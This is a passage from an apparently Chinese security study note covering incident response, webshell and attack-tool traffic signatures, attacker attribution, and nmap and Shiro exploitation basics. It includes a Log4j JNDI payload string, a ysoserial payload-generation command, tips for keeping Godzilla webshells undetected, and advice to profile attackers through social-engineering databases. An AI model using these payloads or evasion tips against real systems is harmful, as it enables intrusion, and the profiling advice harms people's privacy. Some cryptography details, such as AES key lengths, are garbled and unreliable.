基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机 </span><br><span class="line"></span><br><span class="line">gopher:// -- 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前</span><br></pre></td></tr></table></figure>



<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>用户在访问了网站A的情况下，同时访问B网站（恶意），B返回一些攻击性代码，并发出一个请求要求访问第三方站点A，从而进行操作。</p>
<p><strong>防护</strong></p>
<p>尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token</p>
<ol>
<li>配合CSRF Token校验</li>
<li>使用同源策略</li>
</ol>
<h2 id="序列化漏洞"><a href="#序列化漏洞" class="headerlink" title="序列化漏洞"></a>序列化漏洞</h2><p><strong>定义</strong></p>
<p>序列化：把<code>对象转化为可传输的字节序列</code>过程称为序列化。</p>
<p>反序列化：把<code>字节序列还原为对象</code>的过程称为反序列化</p>
<p>在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__construct() 当创建对象时触发，一般用于初始化对象，对变量赋初值</span><br><span class="line">__sleep() 使用serialize()时自动触发 </span><br><span class="line">__wakeup() 使用unserialize()时自动触发</span><br><span class="line">__destruct() 当一个对象被销毁时触发</span><br><span class="line">__toString() 当一个类被当成字符串使用时触发</span><br><span class="line">__invoke() 当尝试以调用函数的方式调用一个对象时触发</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发 </span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() 用于从不可访问的属性读取数据</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9234">https://xz.aliyun.com/t/9234</a></p>
<h2 id="常用分析工具"><a href="#常用分析工具" class="headerlink" title="常用分析工具"></a>常用分析工具</h2><p>日志分析  LogParser</p>
<p>河马</p>
<p>D盾 分析查杀木马</p>
<h2 id="linux常用命令"><a href="#linux常用命令" class="headerlink" title="linux常用命令"></a><strong>linux常用命令</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">find 查找与文本操作   </span><br><span class="line">grep 命令用于查找文件里符合条件的字符串。</span><br><span class="line">strings 打印文件中可打印的字符 </span><br><span class="line">head  显示文件默认前10行内容 </span><br><span class="line">more 类似于more 但是一页一页的显示</span><br><span class="line">tail 命令可用于查看文件的内容， -f 常用于查阅正在改变的日志文件。</span><br><span class="line">lsof 查看指定用户启动的进程   -i :3306 # 查看谁在使用某个端口  -nPi 查看内部对外的网络连接</span><br><span class="line">lastlog 最后一次登录 lastb 登录失败记录 last 登陆成功记录 </span><br><span class="line">netstat  查看网络进程 命令用于显示各种网络相关信息，如网络连接，路由表，接口状态 a参数是列出所有连接，n是不要解析机器名，p列出进程名 </span><br><span class="line">rm 删除操作</span><br><span class="line">who 查看当前用户</span><br><span class="line">w 查看系统信息，知道某一时刻用户行为</span><br><span class="line">uptime 查看登陆了多久，多少用户</span><br><span class="line">pstree命令，该命令以树状图的方式展现进程之间的派生关系</span><br><span class="line">ps 列出进程信息，快照   </span><br><span class="line">top命令 实时显示各个线程情况</span><br></pre></td></tr></table></figure>

<h2 id="应急响应linux"><a href="#应急响应linux" class="headerlink" title="应急响应linux"></a>应急响应linux</h2><p>应急思路：首先通过安全设备拦截攻击包体和日志分析，了解攻击者具体进行了什么样的攻击，通过黑白结合模拟方法进一步判断攻击者的攻击方式。复现之后对漏洞进行修复，对攻击者进行溯源。</p>
<p>1.<strong>查看History详细信息</strong></p>
<p>查看命令执行记录 ~&#x2F;.bash_history分析近期是否有账户执行过恶意操作系统命令</p>
<p>2.<strong>查看文件改动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find ./ -mtime 0 -name &quot;*.php&quot; </span><br><span class="line"></span><br><span class="line">检查最近创建的php、jsp文件和上传目录 例如要查找24小时内被修改的JSP文件： </span><br><span class="line"></span><br><span class="line">stat /etc/passwd #查看密码文件上一次修改的时间，如果最近被修改过，那就可能存在问题。 </span><br><span class="line"></span><br><span class="line">cat /etc/passwd | grep -v nologin #查看除了不可登录以外的用户都有哪些，有没有新增的 </span><br><span class="line"></span><br><span class="line">cat /etc/passwd | grep x:0 #查看哪些用户为root权限，有没有新增的 </span><br></pre></td></tr></table></figure>

<p>3.<strong>账号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0) </span><br><span class="line"></span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd </span><br><span class="line"></span><br><span class="line">2、查询可以远程登录的帐号信息 </span><br><span class="line"></span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow </span><br></pre></td></tr></table></figure>

<p>4.<strong>域名hosts</strong></p>
<p>有一些挖矿程序会修改 &#x2F;etc&#x2F;hosts文件，请看一下其中内容是否被更改过</p>
<p>5.<strong>各类日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析安全日志 /var/log/secure查看是否有IP爆破成功</span><br></pre></td></tr></table></figure>


<ul>
<li>分析&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root Root邮箱，当日志被删除可查询本文件</li>
<li>分析中间件、Web日志，如access_log文件</li>
<li>调用命令last&#x2F;lastb翻阅登录日志</li>
<li>lsof -i :3306 # 查看谁在使用某个端口</li>
<li>分析&#x2F;var&#x2F;log&#x2F;cron文件查看历史计划任务</li>
<li>分析redis、sql server、mysql、oracle等日志文件</li>
</ul>
<p>6.<strong>进程排查：</strong></p>
<ul>
<li>查找进程pid</li>
<li>netstat -antlp    # 检查当前存在的连接与监听端口    </li>
<li>lsof -i:port      定位可疑进程pid</li>
<li>通过pid查找文件</li>
<li>cd &#x2F;proc&#x2F;pid号    即可进入到该进程目录中ls -ail   结果中exe对应的就是该pid程序的目录ls -ail |grep exe</li>
<li>查看各进程占用的内存和cpu <code>top</code></li>
<li>显示当前进程信息 <code>ps</code></li>
<li>实现某个进程的精确查找 <code>ps -ef | grep apache</code></li>
<li>结束进程 <code>kill -9 pid</code></li>
<li>查看进程树 <code>pstree -p</code> 查找异常进程是否有父进程</li>
<li>也可以直接搜索异常进程的名程来查找其位置， <code>find / -name &#39;xxx&#39;</code></li>
</ul>
<p>7.<strong>准备查后门的工具</strong>   </p>
<p>D盾  河马查杀   </p>
<p>8.<strong>清理处置</strong>：杀掉异常进程，删除异常文件，打补丁或者修复相关文件等。</p>
<p> 9.<strong>产出报告</strong>：对此次安全事件进行一个完整的文档描述。</p>
<h2 id="应急响应windows"><a href="#应急响应windows" class="headerlink" title="应急响应windows"></a>应急响应windows</h2><p><strong>可疑账户</strong></p>
<p>查看服务器是否会新增可疑账号、新增账号。打开cmd输入<code>lusrmgr.msc</code>（本地用户和组）<br>看管理员组有没有新增可疑的用户。如果有的话就禁用或者删除即可</p>
<p><strong>克隆账户</strong></p>
<p>查看服务器是否存在隐藏账号、克隆账号等。首先打开注册表查看管理员对应键值<br><code>HKEY_LOCAL_MACHINE-SAM-SAM-Domains-Account-users</code></p>
<p><strong>可疑端口</strong></p>
<p>通过查看外连端口，排查端口对应进程<code>netstat -ano</code> </p>
<p><strong>可疑进程</strong></p>
<p><code>tasklist | findstr “pid”</code>或者输入<code>msinfo32</code>进行一个可视化的查看</p>
<img src="/images/image_1.jpg" style="zoom:50%;">

<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a><strong>日志分析</strong></h2><p>中间件日志和系统日志。结合日志分析工具LogParser排查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4624 - 登录成功</span><br><span class="line">4625 - 登录失败</span><br><span class="line">4634 - 注销成功</span><br><span class="line">4672 - 使用超级用户（管理员）进行登录</span><br><span class="line">4776 - NTLM身份验证登录系统</span><br><span class="line">4648 - 试图使用明确的凭证登录（这个会记录IP等信息）</span><br></pre></td></tr></table></figure>

<p><strong>文件分析</strong></p>
<p>结合一些工具：火绒剑、procexp进行分析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件分析技巧</span><br><span class="line">1. 文件签名</span><br><span class="line">2. 文件链接DLL</span><br></pre></td></tr></table></figure>

<p><strong>计划任务</strong></p>
<p>查看计划任务中有无可疑项</p>
<p>半自动：D盾</p>
<h2 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h2><p><strong>思路</strong></p>
<p><strong>邮件溯源</strong></p>
<p>在攻击者通过邮件钓鱼攻击成功的安全事件中，通过分析钓鱼邮件可以获得一些有效信息，主要可以分为以下几类：</p>
<p><img src="/images/email1.png" alt="image-20230522162925101"></p>
<ol>
<li><p>发件 IP、发件账号、邮件内容（格式特点）可用于将攻击者投递的邮件分类；</p>
</li>
<li><p>发件账号中可能存在个人信息，如：“账号@qq.com”、“昵称@gmail.com” 等此类字符串，检索账号或昵称ID可用于挖掘身份信息；</p>
</li>
<li><p>邮件内容大致可分以下三类：投递物（后门木马、其他攻击组件）；钓鱼网站，包含域名、IP 等信息；其他，需要研究邮件中的字符串，邮件可能存在攻击者的其他账号；</p>
</li>
<li><p>发件 IP、发件服务器（此类属攻击者资产）。</p>
</li>
</ol>
<p><strong>后门溯源</strong></p>
<p><img src="/images/email2.png" alt="image-20230522162925101"></p>
<p>代码逻辑：由于人天生的惰性，红队开发者可能会复用以前的一些代码。如果代码特点比较明显，可依此进行分类拓线。</p>
<p>字符串特点：字符串特点用于将红队投递的样本分类及拓线出更多的样本，将检索到的样本再进行分析并分析历史样本（如测试阶段的样本）查找更多暴露信息。</p>
<p>元数据：（投递的诱饵不同，得到的元数据不同。诱饵类型包括：LNK、EXE、DOCX等）。EXE 文件：存在 PDB 信息，部分开发人员会将项目存放在桌面，这会导致编译信息带入开发人员的终端名称（极大可能为个人昵称）；LNK 文件：由于 LNK 文件在新建的时候会带入计算机名称，这可以用于样本的拓线和分类，极少情况下可找到个人昵称；DOCX 文件：可能存在“最后编辑者名称”。</p>
<p>回连 C2：C2属攻击者资产。</p>
<p><strong>攻击者资产溯源</strong></p>
<p>获得到ip或者域名后进行</p>
<p><img src="/images/email3.png" alt="image-20230522162925101"></p>
<ol>
<li><p>域名自身特点（昵称字符串）看看有没有线索，是不是xx安全团队</p>
</li>
<li><p>如果只有ip，尝试ip反查域名，查询Whois 信息，可能包含：注册者邮箱、电话号码等；</p>
</li>
<li><p>搭建网站（通过图中四种方法探测资产的现有数据和历史数据）。网站可能存在红队的其他攻击组件；网站存在个人昵称、简介等；网站备案信息；</p>
</li>
<li><p>IP 信息需要考虑如下两点：是否定位到某个安全公司的地理位置；是否标记为某个安全公司的网关。</p>
</li>
</ol>
<p>攻击IP，攻击类型，恶意文件，攻击详情等信息都是溯源的切入点，通过攻击类型来分析攻击详情的请求包可以查找有没有攻击特征遗留，对IP地址进行威胁情报查询可以判断对方所用的IP是否为代理IP，以便于进步一追溯攻击者信息。，如发现攻击者的网络圈子ID或手机号，可通过不限于百度、谷歌、SRC信息、微博、贴吧、支付宝、tg社工库等手段收集信息、第四步：如果有蜜罐设备，则分析蜜罐设备日志，如长亭谛听。</p>
<p><img src="/images/image-20230522162854408.png" alt="image-20230522162854408"></p>
<p><strong>反制</strong></p>
<p>首先可以通过安全设备查到攻击ip，然后通过相关网站反查手机号和邮箱，之后可以通过社交软件或购物平台描绘出攻击者画像。</p>
<p>   常用反查网站有ipwhois.cnnic,ip.tool.chinaz,chaipip.com等。</p>
<p><img src="/images/image-20220107173039804.png" alt="image-20220107173039804"></p>
<p><strong>取证工具</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PC Hunter      Windows系统信息查看软件，也是手工杀毒辅助软件。软件可以查看内核文</span><br><span class="line">件、驱动模块、隐藏进程、注册表等等信息</span><br><span class="line"></span><br><span class="line">火绒剑         软件监控，分析样本行为的软件</span><br></pre></td></tr></table></figure>

<p><strong>反制溯源工具准备</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Railgun：集成了端口扫描、端口爆破、web指纹扫描、漏洞扫描、漏洞</span><br><span class="line">利用以及编码转换功能，大批量多线程端口扫描对HW反制工作较为友</span><br><span class="line">好。</span><br></pre></td></tr></table></figure>

<p><strong>邮件溯源</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.检测到异常邮件，上报并与指挥部确认是否发送该邮件</span><br><span class="line">2.封禁该发件人，登陆反垃圾邮件网关查询同主题邮件溯源</span><br><span class="line">3.通过分析主动截获的邮件头，查找来信IP</span><br><span class="line">4.根据发送来的附件进行分析。看是否有回连的情况</span><br><span class="line">5.然后查看接受邮件的主机，进行取证</span><br></pre></td></tr></table></figure>

<h2 id="误报"><a href="#误报" class="headerlink" title="误报"></a>误报</h2><p>误报其实个人看来分为两类</p>
<ol>
<li>将正常操作误报为危险操作</li>
</ol>
<p>这种情况下，常常为一些正常业务导致的告警。比如</p>
<ul>
<li>在一些银行业务中，会涉及到接口获取个人信息，比如身份证等，监控设备会将这些内容认为是一个告警。</li>
<li>内网主机在监控期间，运维人员执行了一些敏感命令，导致了告警</li>
</ul>
<p>以上情况都要根据实际的现场人员去核实、或者多观察源ip，排查该ip一段时间内的流量，去判断是否是一个误报</p>
<ol start="2">
<li>将未攻击成功误报为攻击成功</li>
</ol>
<p>这种常见为一些实际攻击的情况。</p>
<ul>
<li>比如一个文件上传漏洞，在攻击者尝试上传木马后，由于服务器代码逻辑问题，始终返回200，导致设备告警。其实文件并未上传成功</li>
</ul>
<p>​	机器一般他报告里面都会把攻击者的命令，木马文件啥的都写出来，还会生成一个md5，可以在病毒库里面对照md5看看是不是误报，还可以看看命令是不是攻击命令，有可能是管理员在操作，一些危险操作比如创建用户，上传文件啥的就要向上面判断去确认是不是管理员在操作，不是就说明被攻击了。也可以看到木马文件的内容，如果里面是一句话那肯定就不是误报。</p>
<h2 id="寻找Webshell的方法"><a href="#寻找Webshell的方法" class="headerlink" title="寻找Webshell的方法"></a>寻找Webshell的方法</h2><p>1、文件内容中的恶意函数</p>
<blockquote>
<p> PHP：eval(、system(、assert(</p>
<p> JSP：getRunTime(、 FileOutputStream(</p>
<p> ASP：eval(、execute(、 ExecuteGlobal（</p>
</blockquote>
<p>2、Web日志中的webshell特征</p>
<blockquote>
<p> Darkblade：goaction&#x3D;login</p>
<p> JspSpy：o&#x3D;login</p>
<p> PhpSpy：action&#x3D;phpinfo</p>
<p> Regeorg：cmd&#x3D;connect</p>
<p> Other：cmd&#x3D;</p>
</blockquote>
<p>3、贴合Web业务中的url来分析Web日志</p>
<p>4、每天新增的动态脚本文件</p>
<p>5、低频访问的脚本文件</p>
<h2 id="常见加密算法"><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a>常见加密算法</h2><p>最常见的两种加密算法是对称加密和非对称加密。</p>
<h3 id="对称密码算法"><a href="#对称密码算法" class="headerlink" title="对称密码算法"></a>对称密码算法</h3><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/idreamo/p/9333753.html">https://www.cnblogs.com/idreamo/p/9333753.html</a></p>
<h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luop/p/4334160.html">https://www.cnblogs.com/luop/p/4334160.html</a></p>
<ol>
<li>运算速度快，在有反馈模式、无反馈模式的软硬件中，Rijndael都表现出非常好的性能。</li>
<li>对内存的需求非常低,适合于受限环境。</li>
<li>Rijndael 是一个分组迭代密码， 分组长度和密钥长度设计灵活。</li>
<li>AES标准支持可变分组长度，分组长度可设定为32 比特的任意倍数，最小值为128 比特，最大值为256 比特。</li>
<li>AES的密钥长度比DES大， 它也可设定为32 比特的任意倍数，最小值为12 比特，最大值为256 比特，所以用穷举法是不可能破解的。</li>
<li>AES算法的设计策略是WTS。WTS 是针对差分分析和线性分析提出的，可对抗差分密码分析和线性密码分析。</li>
</ol>
<p>而AES的优点， 正是 DES的缺点所在。</p>
<h3 id="非对称加密体系"><a href="#非对称加密体系" class="headerlink" title="非对称加密体系"></a>非对称加密体系</h3><h4 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h4><ul>
<li>RSA 是最著名的公钥密码算法之一，广泛用于加密、数字签名以及密钥交换。</li>
<li>其安全性基于大整数分解问题的难度。</li>
</ul>
<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><ul>
<li><strong>数字签名</strong>：使用私钥进行签名，公钥进行验证。</li>
<li><strong>公钥密码加密解密</strong>：使用公钥进行加密，私钥进行解密。</li>
</ul>
<h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><h3 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h3><p>base64编码  </p>
<p>有一些关键代码没有被加密，容易被识别</p>
<p>1、eval执行php代码<br>2、base64_decode($POST[z0]) ; 设置payload的编码方式<br>3、&amp;z0&#x3D;… 是攻击载荷</p>
<p>菜刀会伪造 XFF 头，且每一次利用菜刀与webshell建立连接，XFF 都会变化。</p>
<p><img src="/images/image-20230522162913498.png" alt="image-20230522162913498"></p>
<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>默认是<strong>URL编码</strong></p>
<p><strong>流量特征</strong></p>
<p>因为蚁剑在数据包中实际上是将解码函数一同发送到服务端，那几个<strong>解码函数</strong>是没法加密的，所以产生一个很明显的流量特征。</p>
<p>data中含有<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code> ，<strong>header中含有antSword字眼</strong></p>
<p><img src="/images/image-20230522162925101.png" alt="image-20230522162925101"></p>
<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>AES对称加密</p>
<p><strong>冰蝎2流量特征</strong></p>
<ul>
<li>2.0中采用协商密钥机制。<strong>第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥</strong></li>
<li>Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, <em>; q&#x3D;.2,</em> &#x2F;*; q&#x3D;.2</li>
<li>建立连接后 所有请求 Cookie的格式都为: Cookie: PHPSESSID&#x3D;; path&#x3D;&#x2F;；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ACCEPT字段:冰蝎2默认Accept字段的值很特殊 </span><br><span class="line"></span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line"></span><br><span class="line">UA字段:冰蝎内置了十余种 UserAgent ，每次连接 shell 会随机选择一个进行使用。但都是比较老的，容易被检测到，但是可以在burp中修改ua头。  *UserAgent可由黑客自定义，因此该特征可能会被绕过</span><br><span class="line"></span><br><span class="line">Content-Length: 16, 16就是冰蝎2连接的特征</span><br></pre></td></tr></table></figure>

<p><strong>冰蝎3</strong></p>
<p>冰蝎3.0 取消动态密钥获取</p>
<p>新增了无动态密钥交互。只有在无动态密钥交互失败后，才会进入常规的密钥交互阶段。密钥生成可以看出，使用密码的md5结果的前16位</p>
<p><strong>冰蝎3流量特征</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">特征分析：</span><br><span class="line">弱特征</span><br><span class="line">长连接（可绕过）</span><br><span class="line">冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。因此默认情况下，请求头和响应头里都会带有:</span><br><span class="line">Connection: Keep-Alive    </span><br><span class="line"></span><br><span class="line">弱特征</span><br><span class="line">user-Agent头  默认16个userAgent</span><br><span class="line"></span><br><span class="line">强特征</span><br><span class="line">1.请求包中content-length 为5740或5720</span><br><span class="line">2.Content-Type: application/octet-stream属于强特征 意思是，只能提交二进制</span><br><span class="line">3.传递的密钥  强特征</span><br><span class="line">加密所用密钥是长度为16的随机字符串，小写字母+数字组成。密钥传递阶段，密钥存在于Response Body</span><br></pre></td></tr></table></figure>

<p><strong>冰蝎4</strong></p>
<p>采用Rc4加密</p>
<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a><strong>哥斯拉</strong></h3><p>java和c#的载荷原生实现AES加密，PHP使用<code>亦或</code>加密。</p>
<p>特征：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.User-Agent (弱特征)</span><br><span class="line">哥斯拉客户端使用JAVA语言编写，在默认的情况下，如果不修改User-Agent，User-Agent会类似于Java/1.8.0_121（具体什么版本取决于JDK环境版本）。</span><br><span class="line"></span><br><span class="line">2.Accept（弱特征）</span><br><span class="line">Accept为text/html, image/gif, image/jpeg, *; q=.2, /; q=.2</span><br><span class="line">对这个默认特征应该很熟悉了，之前冰蝎也出现过同样的Accept。为什么会这么巧合出现两个工具都会出现这个特征呢，其实这个也是JDK引入的一个特征，并不是作者自定义的Accept（参考：https://bugs.openjdk.java.net/browse/JDK-8177439）。同样的这个默认特征也可以通过自定义头部去除，只能作为默认情况下的辅助检测特征。</span><br><span class="line"></span><br><span class="line">3.Cookie (强特征)</span><br><span class="line">在请求包的Cookie中最后的分号。标准的HTTP请求中最后一个Cookie的值是不应该出现;的</span><br><span class="line"></span><br><span class="line">4.请求体特征 (较强特征)</span><br><span class="line">截取到特征发现请求都含有&quot;pass=&quot;</span><br><span class="line">哥斯拉支持对加密的数据进行base64编码以及原始的加密raw两种形式的通讯数据，对于请求体的检测也要考虑两种情况。</span><br><span class="line"></span><br><span class="line">5.响应体特征 (强特征)</span><br><span class="line">和请求体一样，请求响应体也分两个格式，base64编码的和原始加密raw数据。如果请求体采用base64编码，响应体返回的也是base64编码的数据。在使用base64编码时，响应体会出现一个很明显的固定特征。这个特征是客户端和服务端编写的时候引入的。</span><br></pre></td></tr></table></figure>



<p>ps:哥斯拉<strong>避免被查杀</strong>技巧：</p>
<p>1.不使用默认密码（pass）</p>
<p>2.修改ua头</p>
<p>3.填充垃圾数据（post的左右）</p>
<p><strong>优点</strong></p>
<p>全部类型的shell均过市面所有静态查杀</p>
<p>流量加密过市面全部流量waf</p>
<p>Godzilla自带的插件是冰蝎、蚁剑不能比拟的</p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>–os-shell原理 ：就是用into outfile函数将一个可以用来上传的php文件写到网站的根目录下</p>
<p>要求</p>
<p>（1）网站必须是root权限</p>
<p> （2）攻击者需要知道网站的绝对路径</p>
<p> （3）GPC为off，php主动转义的功能关闭</p>
<p><strong>流量特征</strong></p>
<p>1.User-Agent  中带有sqlmap字样</p>
<p>2.上传的小马中，包含所有的命令执行函数</p>
<p>3.sqlmap 成功写入命令马的时候, 会执行一条测试语句<strong>echo command execution test</strong></p>
<p>4.再就是sqlmap会判断当前的操作系统, 而判断操作系统就会使用 <strong>@@version_compile_os</strong></p>
<h3 id="ICMP隧道流量"><a href="#ICMP隧道流量" class="headerlink" title="ICMP隧道流量"></a>ICMP隧道流量</h3><p>异常流量包，数据量更大，且含有命令返回结果</p>
<h3 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP请求中包含特定的JNDI注入Payload，如 $&#123;jndi:ldap://x.x.x.x:1389/Exploit&#125;</span><br><span class="line">HTTP请求中包含特定的User-Agent头，如“ Log4j2”或“ Log4jAPI/2.0.8”等</span><br><span class="line">HTTP响应中包含特定的响应码，如“2.0K”等</span><br><span class="line">HTTP响应中包含特定的响应内容，如“JNDI lookup successful”等</span><br></pre></td></tr></table></figure>



<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><strong>常规使用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-sS (SYN扫描)</span><br><span class="line"></span><br><span class="line">nmap默认端口扫描方式，执行半开扫描，不完成TCP握手流程。只向目标端口发送一个SYN报文，然后等待响应。</span><br><span class="line"></span><br><span class="line">SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。</span><br><span class="line"></span><br><span class="line">如果多次重发后仍没响应， 该端口就被标记为被过滤。</span><br><span class="line"></span><br><span class="line">-sT (TCP扫描)</span><br><span class="line"></span><br><span class="line">一般不使用，会留下连接日志。</span><br><span class="line"></span><br><span class="line">-sU（UDP扫描）</span><br><span class="line"></span><br><span class="line">nmap -v ip 显示详细的扫描过程</span><br><span class="line">nmap -p  ip  扫描指定端口</span><br><span class="line">nmap -A ip  全面扫描操作系统</span><br><span class="line">nmap -sP ip  进行ping扫描主机存活   </span><br><span class="line">nmap -Pn/-P0 ip 禁ping扫描</span><br><span class="line">nmap -sS ip 进行tcp syn扫描 也叫半开放扫描</span><br><span class="line">nmap -sT ip 进行tcp连接扫描 （准确性高）</span><br><span class="line"></span><br><span class="line">nmap -p 1-65535 全端口扫描</span><br></pre></td></tr></table></figure>

<p><strong>nmap流量特征</strong></p>
<p>1.nmap在使用SYN扫描时Windows的窗口值值固定是1024。</p>
<p>2.扫描出的包里面会有一些关键字  比如nmap，nm，nm@p</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line">1、登录Shiro网站，从cookie中获得rememberMe字段的值。</span><br><span class="line">2、利用DNSlog探测，通过ysoserial工具payload。</span><br><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</span><br><span class="line">3、使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。</span><br><span class="line">4、使用构造的rememberMe攻击字符串重新请求网站</span><br><span 